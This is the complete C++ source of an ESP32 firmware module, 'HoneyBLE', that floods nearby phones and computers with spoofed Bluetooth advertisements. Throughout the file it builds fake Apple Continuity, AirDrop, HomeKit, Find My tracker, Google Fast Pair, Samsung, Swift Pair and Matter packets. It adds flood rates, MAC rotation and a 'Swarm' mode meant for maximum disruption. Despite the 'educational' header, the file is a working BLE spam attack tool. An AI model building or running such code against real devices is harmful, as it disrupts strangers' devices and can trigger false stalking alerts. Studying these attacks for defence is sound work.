/*
    hackbox HoneyBLE

    Educational multi-target BLE disruption demo. Emits pairing-prompt
    and notification-triggering advertisements across multiple protocols
    and Apple Continuity subtypes.

    Targets:
      Apple    - Nearby Action 0x07 + Nearby Info 0x0F (pairing popups)
      AirDrop  - Continuity 0x05 (file transfer prompt)
      HomeKit  - Continuity 0x06 (persistent setup popup)
      Handoff  - Continuity 0x0C (dock/lockscreen icon)
      FindMy   - Continuity 0x12 (AirTag "tracker near you" alert)
      Android  - Google Fast Pair (svc 0xFE2C) with curated model IDs
      Samsung  - Galaxy-specific Fast Pair model IDs
      Windows  - Microsoft Swift Pair beacon (CID 0x0006)
      Matter   - Matter commissioning (CID 0x0059, cross-platform)
      Swarm    - random pick of ALL targets per emit

    Rate: Slow(1), Normal(3), Fast(5), Flood(10) emits per loop call.

    Controls:
      UP    - start/stop
      RIGHT - cycle target
      DOWN  - cycle rate
      LEFT  - exit (handled globally by framework)

    Educational / authorized targets only. Devices you own or lab bench.
*/

#include "../include/honeyble.h"
#include "../include/pindefs.h"
#include "../include/radio_manager.h"
#include "../include/display_mirror.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include <string.h>
#include <stdio.h>
#include <esp_system.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern Adafruit_NeoPixel pixels;

// ============================================================
// Types + tables
// ============================================================

enum HoneyTarget : uint8_t {
    TGT_APPLE = 0,
    TGT_AIRDROP,
    TGT_HOMEKIT,
    TGT_HANDOFF,
    TGT_FINDMY,
    TGT_ANDROID,
    TGT_SAMSUNG,
    TGT_WINDOWS,
    TGT_MATTER,
    TGT_SWARM,
    TGT_COUNT
};

enum HoneyRate : uint8_t {
    RATE_SLOW = 0,
    RATE_NORMAL,
    RATE_FAST,
    RATE_FLOOD,
    RATE_COUNT
};

static const char *const targetNames[TGT_COUNT] = {
    "Apple", "AirDrop", "HomeKit", "Handoff", "FindMy",
    "Android", "Samsung", "Windows", "Matter", "Swarm"
};
static const char *const rateNames[RATE_COUNT] = {
    "Slow", "Normal", "Fast", "Flood"
};
static const uint8_t rateBatchSize[RATE_COUNT] = { 1, 3, 6, 10 };

// Apple Nearby Action (subtype 0x07) model IDs
struct AppleModel {
    uint16_t value;
    const char *name;
};
static const AppleModel appleModels[] = {
    {0x0E20, "AirPods Pro"},
    {0x1420, "AirPods Pro 2"},
    {0x0A20, "AirPods Max"},
    {0x1320, "AirPods 3"},
    {0x0055, "AirTag"},
    {0x1720, "Beats Studio Pro"},
    {0x1220, "Beats Fit Pro"},
    {0x1620, "Beats Studio Buds+"},
    {0x0B20, "Powerbeats Pro"},
    {0x0620, "Beats Solo 3"},
    {0x0520, "Beats X"},
    {0x1020, "Beats Flex"},
    {0x1120, "Beats Solo Pro"},
    {0x0920, "AirPods 2"},
    {0x0220, "AirPods 1"},
    {0x0F20, "AirPods Max 2"},
    {0x1520, "Beats Studio Buds"},
    {0x0D20, "Powerbeats Pro 2"},
    {0x0C20, "Beats Solo 4"},
    {0x1820, "Beats Pill+"},
};
static constexpr uint8_t appleModelCount =
    sizeof(appleModels) / sizeof(appleModels[0]);

// Apple Nearby Info (subtype 0x0F) action IDs
struct AppleAction {
    uint8_t value;
    const char *name;
};
static const AppleAction appleActions[] = {
    {0x09, "Setup iPhone"},
    {0x2F, "Sign in Other"},
    {0x01, "Setup ATV"},
    {0x20, "Join ATV?"},
    {0x13, "ATV AutoFill"},
    {0x0B, "HomePod Setup"},
    {0x0D, "HomeKit ATV"},
    {0x2B, "AppleID ATV"},
    {0x24, "Vision Pro"},
    {0x02, "Xfer Phone"},
};
static constexpr uint8_t appleActionCount =
    sizeof(appleActions) / sizeof(appleActions[0]);

// Android Fast Pair model IDs (service 0xFE2C)
struct FastPairModel {
    uint32_t value;
    const char *name;
};
static const FastPairModel fastpairModels[] = {
    {0xCD8256, "Bose NC 700"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-XM4"},
    {0x0E30C3, "Razer HH TWS"},
    {0x92BBBD, "Pixel Buds"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x0577B1, "Galaxy S23U"},
    {0x0000F0, "Bose QC35"},
    {0x1F181A, "LinkBuds S"},
};
static constexpr uint8_t fastpairCount =
    sizeof(fastpairModels) / sizeof(fastpairModels[0]);

// Samsung Galaxy-specific Fast Pair model IDs
static const FastPairModel samsungModels[] = {
    {0xEE7A0C, "Galaxy Buds2 Pro"},
    {0x9DB006, "Galaxy Buds FE"},
    {0xA7C62C, "Galaxy Buds Live"},
    {0xB5A235, "Galaxy Buds Pro"},
    {0xF2020E, "Galaxy Buds2"},
    {0xD5A642, "Galaxy Buds+"},
    {0xFFB6C1, "Galaxy Buds3 Pro"},
    {0xA8B91C, "Galaxy Buds3"},
    {0xE1A72D, "Galaxy Ring"},
    {0xC895FB, "Galaxy Watch6"},
};
static constexpr uint8_t samsungCount =
    sizeof(samsungModels) / sizeof(samsungModels[0]);

// Microsoft Swift Pair device names
static const char *const swiftNames[] = {
    "hackbox",
    "Toaster",
    "Listening Dev",
    "FBI Van",
    "Dark Web Node",
    "Air Tag Max",
    "ATM Machine",
    "Ejection Seat",
    "Honey Trap",
    "Classified",
};
static constexpr uint8_t swiftNameCount =
    sizeof(swiftNames) / sizeof(swiftNames[0]);

// HomeKit accessory categories for spoofed setup popups
static const char *const homekitCategories[] = {
    "Light", "Switch", "Thermostat", "Lock", "Camera",
    "Sensor", "Outlet", "Fan", "Garage", "Speaker",
};
static constexpr uint8_t homekitCatCount =
    sizeof(homekitCategories) / sizeof(homekitCategories[0]);

// ============================================================
// State
// ============================================================

static HoneyTarget target = TGT_SWARM;
static HoneyRate rate = RATE_NORMAL;
static bool active = false;
static bool bleInitialized = false;
static bool isAdvertising = false;
static uint32_t sentCount = 0;
static uint32_t perTargetCount[TGT_COUNT] = {0};
static char lastLabel[24] = "";
static bool needsRedraw = true;
static unsigned long lastButton = 0;
static unsigned long lastDisplayUpdate = 0;
static constexpr unsigned long debounceMs = 200;
static constexpr unsigned long displayUpdateMs = 500;

// Non-connectable: matches proven Sour Apple approach. Prevents ESP32 from
// wasting time servicing scan/connect requests from nearby devices.
static esp_ble_adv_params_t adv_params_nonconn = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// Connectable: needed for Fast Pair / Swift Pair notifications on Android/Windows
static esp_ble_adv_params_t adv_params_conn = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ============================================================
// Payload builders ,Apple Continuity subtypes
// ============================================================

static void buildAppleNearbyAction(uint8_t *buf, uint8_t *outLen, char *label) {
    uint16_t modelVal;
    const char *modelName;
    if (random(100) < 70) {
        const AppleModel &m = appleModels[random(appleModelCount)];
        modelVal = m.value;
        modelName = m.name;
    } else {
        modelVal = (uint16_t)random(0x0100, 0x1FFF);
        modelName = "Rnd";
    }
    uint8_t i = 0;
    buf[i++] = 0x1E;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x07;  // Continuity subtype: Proximity Pairing
    buf[i++] = 0x19;
    buf[i++] = 0x07;
    buf[i++] = (uint8_t)((modelVal >> 8) & 0xFF);
    buf[i++] = (uint8_t)(modelVal & 0xFF);
    buf[i++] = 0x20;
    buf[i++] = 0x75;
    buf[i++] = 0xAA;
    buf[i++] = 0x30;
    buf[i++] = 0x01;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x45;
    for (uint8_t k = 0; k < 14; k++) buf[i++] = (uint8_t)random(256);
    *outLen = i;
    snprintf(label, 24, "A:%.17s", modelName);
}

static void buildAppleNearbyInfo(uint8_t *buf, uint8_t *outLen, char *label) {
    const AppleAction &a = appleActions[random(appleActionCount)];
    uint8_t i = 0;
    buf[i++] = 0x0A;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;  // Continuity subtype: Nearby Action
    buf[i++] = 0x05;
    buf[i++] = 0xC0;
    buf[i++] = a.value;
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    *outLen = i;
    snprintf(label, 24, "A:%.17s", a.name);
}

// AirDrop (Continuity type 0x05) ,triggers file transfer prompt on iOS/macOS
static void buildAirDrop(uint8_t *buf, uint8_t *outLen, char *label) {
    uint8_t i = 0;
    buf[i++] = 0x1E;  // AD length 30
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x05;  // Continuity type: AirDrop
    buf[i++] = 0x12;  // length 18
    buf[i++] = 0x00;  // flags
    // 8 bytes: truncated SHA256 of AppleID contact hashes (random = unique sender)
    for (uint8_t k = 0; k < 8; k++) buf[i++] = (uint8_t)random(256);
    // 6 bytes: truncated SHA256 of phone number (random)
    for (uint8_t k = 0; k < 6; k++) buf[i++] = (uint8_t)random(256);
    // Remaining padding
    while (i < 31) buf[i++] = (uint8_t)random(256);
    *outLen = i;
    strlcpy(label, "AD:AirDrop", 24);
}

// HomeKit (Continuity type 0x06) ,triggers accessory setup popup
static void buildHomeKit(uint8_t *buf, uint8_t *outLen, char *label) {
    uint8_t i = 0;
    buf[i++] = 0x14;  // AD length 20
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x06;  // Continuity type: HomeKit
    buf[i++] = 0x0F;  // length 15
    buf[i++] = 0x01;  // flags: accessory available for pairing
    // Device ID (6 bytes, random)
    for (uint8_t k = 0; k < 6; k++) buf[i++] = (uint8_t)random(256);
    // Accessory category (2 bytes): pick a random category
    uint16_t cat = (uint16_t)(1 + random(19));  // HAP categories 1-19
    buf[i++] = (uint8_t)((cat >> 8) & 0xFF);
    buf[i++] = (uint8_t)(cat & 0xFF);
    // State number, config number
    buf[i++] = 0x01;
    buf[i++] = (uint8_t)random(256);
    // Feature flags + status flags
    buf[i++] = 0x04;  // supports BLE pairing
    buf[i++] = 0x01;
    // Setup hash (3 bytes)
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    *outLen = i;
    uint8_t catIdx = random(homekitCatCount);
    snprintf(label, 24, "HK:%.13s", homekitCategories[catIdx]);
}

// Handoff (Continuity type 0x0C) ,persistent dock/lockscreen icon
static void buildHandoff(uint8_t *buf, uint8_t *outLen, char *label) {
    uint8_t i = 0;
    buf[i++] = 0x11;  // AD length 17
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0C;  // Continuity type: Handoff
    buf[i++] = 0x0C;  // length 12
    // Clipboard byte + sequence counter
    buf[i++] = 0x01;
    buf[i++] = (uint8_t)random(256);
    // AES-GCM encrypted activity data (10 bytes, random = different activity each time)
    for (uint8_t k = 0; k < 10; k++) buf[i++] = (uint8_t)random(256);
    *outLen = i;
    strlcpy(label, "HO:Handoff", 24);
}

// Find My / AirTag (Continuity type 0x12) ,"tracker near you" alert
static void buildFindMy(uint8_t *buf, uint8_t *outLen, char *label) {
    uint8_t i = 0;
    buf[i++] = 0x1E;  // AD length 30
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x12;  // Continuity type: Find My
    buf[i++] = 0x19;  // length 25
    // Status byte: 0x00 = maintained state (looks like a real active tracker)
    buf[i++] = 0x00;
    // 22 bytes of EC public key fragment (random = unique tracker identity each emit)
    for (uint8_t k = 0; k < 22; k++) buf[i++] = (uint8_t)random(256);
    // Hint byte + additional
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    *outLen = i;
    strlcpy(label, "FM:AirTag", 24);
}

// ============================================================
// Payload builders ,non-Apple
// ============================================================

static void buildFastPair(uint8_t *buf, uint8_t *outLen, char *label,
                          const FastPairModel *table, uint8_t tableCount,
                          const char *prefix) {
    const FastPairModel &m = table[random(tableCount)];
    uint8_t i = 0;
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = 0x06;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (uint8_t)((m.value >> 16) & 0xFF);
    buf[i++] = (uint8_t)((m.value >> 8) & 0xFF);
    buf[i++] = (uint8_t)(m.value & 0xFF);
    buf[i++] = 0x02;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)(-60 + (int)random(20));
    *outLen = i;
    snprintf(label, 24, "%s:%.15s", prefix, m.name);
}

static void buildSwiftPair(uint8_t *buf, uint8_t *outLen, char *label) {
    const char *name = swiftNames[random(swiftNameCount)];
    uint8_t nameLen = (uint8_t)strlen(name);
    if (nameLen > 13) nameLen = 13;

    uint8_t i = 0;
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    buf[i++] = 0x02;
    buf[i++] = 0x0A;
    buf[i++] = 0x09;
    buf[i++] = (uint8_t)(6 + nameLen);
    buf[i++] = 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x00;
    buf[i++] = 0x03;
    buf[i++] = 0x00;
    buf[i++] = 0x80;
    for (uint8_t k = 0; k < nameLen; k++) buf[i++] = (uint8_t)name[k];
    *outLen = i;
    snprintf(label, 24, "W:%.13s", name);
}

// Matter commissioning (CID 0x0059) ,triggers "new device" on iOS, Android, ChromeOS
static void buildMatter(uint8_t *buf, uint8_t *outLen, char *label) {
    uint8_t i = 0;
    // Flags: LE General Discoverable
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    // Service UUID: 0xFFF6 (Matter BLE service)
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0xF6;
    buf[i++] = 0xFF;
    // Service Data for 0xFFF6: Matter commissioning advertisement
    buf[i++] = 0x0F;  // length 15
    buf[i++] = 0x16;  // Service Data type
    buf[i++] = 0xF6;
    buf[i++] = 0xFF;
    // Opcode 0x00 = commissionable
    buf[i++] = 0x00;
    // Discriminator (12-bit, randomized) + advertisement version
    uint16_t disc = (uint16_t)random(4096);
    buf[i++] = (uint8_t)(disc & 0xFF);
    buf[i++] = (uint8_t)(((disc >> 8) & 0x0F) | 0x00);
    // Vendor ID (random known vendor)
    uint16_t vid = (uint16_t)random(0x0001, 0x0FFF);
    buf[i++] = (uint8_t)(vid & 0xFF);
    buf[i++] = (uint8_t)((vid >> 8) & 0xFF);
    // Product ID
    uint16_t pid = (uint16_t)random(0x0001, 0x00FF);
    buf[i++] = (uint8_t)(pid & 0xFF);
    buf[i++] = (uint8_t)((pid >> 8) & 0xFF);
    // Additional data (padding)
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    buf[i++] = (uint8_t)random(256);
    *outLen = i;
    snprintf(label, 24, "MT:D%u", disc);
}

// Scan responses removed -- they add config overhead per packet and are not
// needed to trigger popups. Matches Sour Apple's approach.

// ============================================================
// Advertise cycle
// ============================================================

// Rotate MAC every N emits so target devices see repeated ads from the same
// source -- critical for triggering popups. Sour Apple uses 10; we use 8.
static constexpr uint8_t MAC_ROTATE_INTERVAL = 8;
static uint8_t macRotateCounter = 0;
static unsigned long lastAdv = 0;

static void advertiseOne(const uint8_t *packet, uint8_t size, bool connectable) {
    // Match BLE Spammer's proven timing: 15ms gate + stop/5ms + config + 5ms + start
    unsigned long now = millis();
    if (now - lastAdv < 15) delay(15 - (now - lastAdv));

    if (isAdvertising) {
        esp_ble_gap_stop_advertising();
        delay(5);
        isAdvertising = false;
    }

    // MAC every 8 packets instead of every 1
    if (++macRotateCounter >= MAC_ROTATE_INTERVAL) {
        macRotateCounter = 0;
        uint8_t addr[6];
        for (uint8_t i = 0; i < 6; i++) addr[i] = (uint8_t)random(256);
        addr[0] = (addr[0] & 0x3F) | 0xC0;
        esp_ble_gap_set_rand_addr(addr);
    }

    esp_ble_gap_config_adv_data_raw((uint8_t *)packet, size);
    delay(5);
    esp_ble_gap_start_advertising(connectable ? &adv_params_conn : &adv_params_nonconn);
    isAdvertising = true;
    lastAdv = millis();
}

// ============================================================
// Per-target emit dispatchers
// ============================================================

// Apple targets: non-connectable (proven by Sour Apple)
// Fast Pair / Swift Pair: connectable (needed for Android/Windows notification)
// Matter: non-connectable (commissioning broadcast)

static void emitApple() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    if (random(100) < 60)
        buildAppleNearbyAction(buf, &len, label);
    else
        buildAppleNearbyInfo(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_APPLE]++;
}

static void emitAirDrop() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildAirDrop(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_AIRDROP]++;
}

static void emitHomeKit() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildHomeKit(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_HOMEKIT]++;
}

static void emitHandoff() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildHandoff(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_HANDOFF]++;
}

static void emitFindMy() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildFindMy(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_FINDMY]++;
}

static void emitAndroid() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildFastPair(buf, &len, label, fastpairModels, fastpairCount, "G");
    advertiseOne(buf, len, true);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_ANDROID]++;
}

static void emitSamsung() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildFastPair(buf, &len, label, samsungModels, samsungCount, "S");
    advertiseOne(buf, len, true);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_SAMSUNG]++;
}

static void emitWindows() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildSwiftPair(buf, &len, label);
    advertiseOne(buf, len, true);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_WINDOWS]++;
}

static void emitMatter() {
    uint8_t buf[31];
    uint8_t len = 0;
    char label[24];

    buildMatter(buf, &len, label);
    advertiseOne(buf, len, false);
    strlcpy(lastLabel, label, sizeof(lastLabel));
    perTargetCount[TGT_MATTER]++;
}

static void emitSwarm() {
    // Cycle across all 9 real targets for maximum cross-platform disruption
    switch (random(9)) {
        case 0:  emitApple();   break;
        case 1:  emitAirDrop(); break;
        case 2:  emitHomeKit(); break;
        case 3:  emitHandoff(); break;
        case 4:  emitFindMy();  break;
        case 5:  emitAndroid(); break;
        case 6:  emitSamsung(); break;
        case 7:  emitWindows(); break;
        default: emitMatter();  break;
    }
}

// ============================================================
// Display
// ============================================================

static void drawDisplay() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);

    u8g2.drawStr(0, 10, "HoneyBLE");
    u8g2.drawLine(0, 12, u8g2.getUTF8Width("HoneyBLE"), 12);

    u8g2.setFont(u8g2_font_6x10_tr);
    char line[32];

    snprintf(line, sizeof(line), "Target: %s", targetNames[target]);
    u8g2.drawStr(0, 24, line);

    snprintf(line, sizeof(line), "Rate:   %s", rateNames[rate]);
    u8g2.drawStr(0, 34, line);

    snprintf(line, sizeof(line), "Status: %s", active ? "Active" : "Idle");
    u8g2.drawStr(0, 44, line);

    u8g2.setFont(u8g2_font_4x6_tr);
    snprintf(line, sizeof(line), "Sent %lu %s",
             (unsigned long)sentCount,
             lastLabel[0] ? lastLabel : "-");
    u8g2.drawStr(0, 54, line);

    u8g2.drawStr(0, 62, "U:run R:tgt D:rate L:exit");

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ============================================================
// Public entry points
// ============================================================

void honeybleSetup() {
    randomSeed((uint32_t)esp_random());
    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    initBLE();
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

    esp_ble_gap_register_callback(
        [](esp_gap_ble_cb_event_t, esp_ble_gap_cb_param_t *) {});

    bleInitialized = true;
    isAdvertising = false;
    delay(100);

    target = TGT_SWARM;
    rate = RATE_NORMAL;
    active = false;
    sentCount = 0;
    for (int i = 0; i < TGT_COUNT; i++) perTargetCount[i] = 0;
    lastLabel[0] = '\0';
    needsRedraw = true;
    lastButton = 0;
    lastDisplayUpdate = 0;
    macRotateCounter = 0;
    lastAdv = 0;

    drawDisplay();
}

void honeybleLoop() {
    unsigned long now = millis();

    if (now - lastButton > debounceMs) {
        bool up    = digitalRead(BUTTON_PIN_UP)    == LOW;
        bool down  = digitalRead(BUTTON_PIN_DOWN)  == LOW;
        bool left  = digitalRead(BUTTON_PIN_LEFT)  == LOW;
        bool right = digitalRead(BUTTON_PIN_RIGHT) == LOW;

        (void)left;
        if (up) {
            active = !active;
            if (!active && isAdvertising) {
                esp_ble_gap_stop_advertising();
                delay(50);
                isAdvertising = false;
                macRotateCounter = 0;
            }
            needsRedraw = true;
            lastButton = now;
        } else if (right) {
            target = (HoneyTarget)((target + 1) % TGT_COUNT);
            needsRedraw = true;
            lastButton = now;
        } else if (down) {
            rate = (HoneyRate)((rate + 1) % RATE_COUNT);
            needsRedraw = true;
            lastButton = now;
        }
    }

    if (active) {
        uint8_t batch = rateBatchSize[rate];
        for (uint8_t i = 0; i < batch; i++) {
            switch (target) {
                case TGT_APPLE:   emitApple();   break;
                case TGT_AIRDROP: emitAirDrop(); break;
                case TGT_HOMEKIT: emitHomeKit(); break;
                case TGT_HANDOFF: emitHandoff(); break;
                case TGT_FINDMY:  emitFindMy();  break;
                case TGT_ANDROID: emitAndroid(); break;
                case TGT_SAMSUNG: emitSamsung(); break;
                case TGT_WINDOWS: emitWindows(); break;
                case TGT_MATTER:  emitMatter();  break;
                case TGT_SWARM:   emitSwarm();   break;
                default: break;
            }
            sentCount++;
            if (sentCount > 999999) sentCount = 0;
        }
    }

    if (now - lastDisplayUpdate >= displayUpdateMs) {
        lastDisplayUpdate = now;
        needsRedraw = true;
    }

    if (needsRedraw) {
        drawDisplay();
        needsRedraw = false;
    }
}
